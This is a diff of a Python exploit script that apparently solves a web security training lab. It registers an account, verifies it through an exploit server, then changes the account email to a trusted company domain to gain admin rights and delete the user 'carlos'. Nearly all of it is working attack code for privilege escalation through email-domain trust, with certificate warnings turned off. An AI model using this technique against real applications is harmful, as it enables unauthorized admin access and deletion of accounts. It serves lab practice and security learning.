@@ -1,11 +1,10 @@
 import random
 import string
-import time
+
 import requests
 import sys
 import urllib3
 from bs4 import BeautifulSoup
-import re
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore
 
@@ -53,6 +52,9 @@ def register(s, url, path, username, email, password):
     
     if 'Please check your emails for your account registration link' in r.text and r.status_code == 200:
         print('[+] Successful register')
+    elif 'An account already exists with that username' in r.text and r.status_code == 200:
+        print('[-] Account already exist')
+        sys.exit(-1)
     else:
         print('[-] Failed to register')
         sys.exit(-1)
@@ -76,6 +78,20 @@ def verify(s, exploit_url, exploit_path, search_string):
         print('[+] Successful verify register')
     else:
         print('[-] Failed verify register')
+        sys.exit(-1)
+
+def change_email(s, url, path, csrf_path, new_email):
+    target_url = url + path
+    payload = {
+        'csrf': get_csrf_token(s, url, csrf_path),
+        'email': new_email
+    }
+    r = s.post(target_url, data=payload, allow_redirects=True)
+
+    if new_email in r.text and r.status_code == 200:
+        print(f'[+] Successful change email to {new_email}')
+    else:
+        print('[-] Failed to change email')
         sys.exit(-1)
 
 def delete_user(s, url, path, username):
@@ -105,9 +121,10 @@ def main():
     exploit_url = sys.argv[2][:-1] if sys.argv[2][-1] == '/' else sys.argv[2]
 
     chars = string.ascii_lowercase
-    random_str = ''.join(random.choices(chars, k=238))
+    random_str = ''.join(random.choices(chars, k=8))
     username = ''.join(random.choices(chars, k=8))
-    email = random_str + f'@dontwannacry.com.{exploit_url.split('//')[1]}'
+    email = random_str + f'@{exploit_url.split('//')[1]}'
+    new_email = random_str + '@dontwannacry.com'
     password = ''.join(random.choices(chars, k=8))
     print(f'username={username}')
     print(f'password={password}')
@@ -115,6 +132,7 @@ def main():
     register(s, url, '/register', username, email, password)
     verify(s, exploit_url, '/email', '/register?temp-registration-token=')
     login_acc(s, url, '/login', username, password)
+    change_email(s, url, '/my-account/change-email', '/my-account', new_email)
     delete_user(s, url, '/admin/delete', 'carlos')
     check_solved_lab(s, url)
 
